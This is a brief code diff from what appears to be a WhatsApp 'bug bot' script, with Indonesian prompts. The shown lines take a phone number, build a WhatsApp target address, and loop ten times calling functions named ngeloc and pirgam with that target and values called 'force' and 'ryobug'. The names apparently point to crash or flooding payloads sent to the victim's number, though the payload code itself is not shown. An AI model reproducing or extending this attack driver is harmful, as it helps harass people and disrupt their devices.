@@ -832,7 +832,7 @@ if (!q) return reply(`Type .${command} 254729553638`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
-await reply(mess.bugrespon)
+m.reply("wait a moment");
 for (let j = 0; j < 10; j++) {
 await ngeloc(target, force)
 await pirgam(target, ryobug)
